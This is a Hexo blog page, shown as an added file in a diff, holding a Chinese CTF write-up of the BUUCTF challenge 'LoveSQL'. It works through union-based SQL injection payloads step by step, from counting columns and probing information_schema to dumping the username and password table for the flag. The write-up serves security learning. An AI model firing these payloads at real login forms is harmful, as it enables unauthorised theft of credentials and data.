@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>BUUCTF系列 // [极客大挑战 2019] LoveSQL | 正当年少</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="前言本题知识点：SQL注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUCTF系列 &#x2F;&#x2F; [极客大挑战 2019] LoveSQL">
+<meta property="og:url" content="http://yoursite.com/2020/10/03/BUUCTF%E7%B3%BB%E5%88%97-[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019]-LoveSQL/index.html">
+<meta property="og:site_name" content="正当年少">
+<meta property="og:description" content="前言本题知识点：SQL注入">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201003144659849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201003150544605.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201003151140631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201003151405908.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201003151852533.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201003152154356.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201003152817370.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201003152601569.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201003153322363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="article:published_time" content="2020-10-03T07:47:18.000Z">
+<meta property="article:modified_time" content="2020-10-03T07:48:13.656Z">
+<meta property="article:author" content="Lzy">
+<meta property="article:tag" content="SQL注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20201003144659849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70#pic_center">
+  
+    <link rel="alternate" href="/atom.xml" title="正当年少" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">正当年少</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-BUUCTF系列-[极客大挑战-2019]-LoveSQL" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/10/03/BUUCTF%E7%B3%BB%E5%88%97-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019%5D-LoveSQL/" class="article-date">
+  <time datetime="2020-10-03T07:47:18.000Z" itemprop="datePublished">2020-10-03</time>
+  
+        <!-- 不蒜子统计 -->
+        <i class="icon-smile icon"></i> 文章阅读量<span id="busuanzi_value_page_pv"></span>次
+
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      BUUCTF系列 // [极客大挑战 2019] LoveSQL
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本题知识点：<strong><em>SQL注入</em></strong></p>
+<a id="more"></a>
+<h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>（<del>这题居然是个连续剧。。。</del> ）</p>
+<p>首先尝试使用上一题的解法绕过看看(上一题 WP 的 <a href="https://blog.csdn.net/qq_45805420/article/details/108804093" target="_blank" rel="noopener">传送门</a>)，结果如下：</p>
+<p><img src="https://img-blog.csdnimg.cn/20201003144659849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>注意到密码有些奇怪，尝试着用 MD5 解码失败，也没啥思路（最后事实证明确实也用不到这玩意），故回到 SQL 注入上面来寻找突破</p>
+<h5 id="1、查询字段数"><a href="#1、查询字段数" class="headerlink" title="1、查询字段数"></a>1、查询字段数</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">...?username&#x3D;admin&#39;order by 列数#&amp;password&#x3D;123</span><br><span class="line">&#x2F;&#x2F; #号需要手动进行 URL 编码即替换成 %23</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20201003150544605.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>可知共有3个字段</p>
+<h5 id="2、测试注入点"><a href="#2、测试注入点" class="headerlink" title="2、测试注入点"></a>2、测试注入点</h5><p>接着使用联合查询寻找注入点即回显点位</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...?username&#x3D;1&#39;union select 1,2,3%23&amp;password&#x3D;123</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20201003151140631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h5 id="3、查询当前数据库名、用户名"><a href="#3、查询当前数据库名、用户名" class="headerlink" title="3、查询当前数据库名、用户名"></a>3、查询当前数据库名、用户名</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...?username&#x3D;1&#39;union select 1,user(),database()%23&amp;password&#x3D;123</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20201003151405908.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h5 id="4、查询当前库中所有表"><a href="#4、查询当前库中所有表" class="headerlink" title="4、查询当前库中所有表"></a>4、查询当前库中所有表</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...?username&#x3D;1&#39;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()%23&amp;password&#x3D;123</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20201003151852533.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h5 id="5、查询表中所有字段"><a href="#5、查询表中所有字段" class="headerlink" title="5、查询表中所有字段"></a>5、查询表中所有字段</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...?username&#x3D;1&#39;union select 1,2,group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;l0ve1ysq1&#39;%23&amp;password&#x3D;123</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20201003152154356.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h5 id="6、爆出所有字段的数据"><a href="#6、爆出所有字段的数据" class="headerlink" title="6、爆出所有字段的数据"></a>6、爆出所有字段的数据</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...?username&#x3D;1&#39;union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23&amp;password&#x3D;123</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20201003152817370.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201003152601569.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>得到 flag</p>
+<p>为了更加方便，可以将换行符 &#39;\n&#39; 设置为 group_concat() 函数的分隔符，该函数的语法可参考 <a href="https://blog.csdn.net/qq_35531549/article/details/90383022" target="_blank" rel="noopener">SQL函数Group_concat用法</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...?username&#x3D;1&#39;union select 1,2,group_concat(id,username,password separator &#39;\n&#39;) from l0ve1ysq1%23&amp;password&#x3D;123</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20201003153322363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/10/03/BUUCTF%E7%B3%BB%E5%88%97-[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019]-LoveSQL/" data-id="ckftdlzrs00094gusbofh4y7v" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2020/10/02/BUUCTF%E7%B3%BB%E5%88%97-Web-ez%E9%A2%98-Writeup/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">BUUCTF系列 // Web ez题 Writeup</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSRF-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/" rel="tag">CSRF(跨站请求伪造)</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTP%E8%AF%B7%E6%B1%82%E5%A4%B4/" rel="tag">HTTP请求头</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Have-a-nice-day/" rel="tag">Have a nice day!</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Hexo/" rel="tag">Hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">PHP代码审计</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" rel="tag">PHP反序列化漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSTI-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" rel="tag">SSTI(服务端模板注入)</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WP/" rel="tag">WP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/" rel="tag">一句话木马</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" rel="tag">命令执行漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-File-Inclusion/" rel="tag">文件包含漏洞(File Inclusion)</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CSRF-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/" style="font-size: 10px;">CSRF(跨站请求伪造)</a> <a href="/tags/HTTP%E8%AF%B7%E6%B1%82%E5%A4%B4/" style="font-size: 10px;">HTTP请求头</a> <a href="/tags/Have-a-nice-day/" style="font-size: 10px;">Have a nice day!</a> <a href="/tags/Hexo/" style="font-size: 10px;">Hexo</a> <a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">PHP代码审计</a> <a href="/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">PHP反序列化漏洞</a> <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 20px;">SQL注入</a> <a href="/tags/SSTI-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 15px;">SSTI(服务端模板注入)</a> <a href="/tags/WP/" style="font-size: 15px;">WP</a> <a href="/tags/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/" style="font-size: 10px;">一句话木马</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">命令执行漏洞</a> <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-File-Inclusion/" style="font-size: 15px;">文件包含漏洞(File Inclusion)</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">十月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">九月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">八月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">七月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">六月 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/10/03/BUUCTF%E7%B3%BB%E5%88%97-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019%5D-LoveSQL/">BUUCTF系列 // [极客大挑战 2019] LoveSQL</a>
+          </li>
+        
+          <li>
+            <a href="/2020/10/02/BUUCTF%E7%B3%BB%E5%88%97-Web-ez%E9%A2%98-Writeup/">BUUCTF系列 // Web ez题 Writeup</a>
+          </li>
+        
+          <li>
+            <a href="/2020/10/01/BUUCTF%E7%B3%BB%E5%88%97-%5BGXYCTF-2019%5D-Ping-Ping-Ping/">BUUCTF系列 // [GXYCTF2019] Ping Ping Ping</a>
+          </li>
+        
+          <li>
+            <a href="/2020/09/26/BUUCTF%E7%B3%BB%E5%88%97-%5BSUCTF-2019%5D-EasySQL/">BUUCTF系列 // [SUCTF 2019] EasySQL</a>
+          </li>
+        
+          <li>
+            <a href="/2020/09/25/BUUCTF%E7%B3%BB%E5%88%97-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019%5D-Secret%20File/">BUUCTF系列 // [极客大挑战 2019] Secret File</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      
+<!-- require APlayer -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">
+<script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
+
+<!-- require MetingJS -->
+<script src="https://cdn.jsdelivr.net/npm/meting@2.0.1/dist/Meting.min.js"></script>
+
+<!--使用-->
+<div>
+<meting-js 
+	server="netease" 
+	type="playlist" 
+	id="5060904263"
+	fixed="true" 
+	autoplay="true"
+	loop="all"
+	order="random"
+	preload="auto"
+	list-folded="ture"
+	lrc-type="0"
+  volume=0.2
+	list-max-height="400px">
+</meting-js>
+</div>
+
+<footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 Lzy<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+      
+        <!-- 不蒜子统计 -->
+        本站访问量 <span id="busuanzi_value_site_pv"></span> 次
+        <span class="post-meta-divider">|</span>
+        本站访客数 <span id="busuanzi_value_site_uv"></span> 人
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+   
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
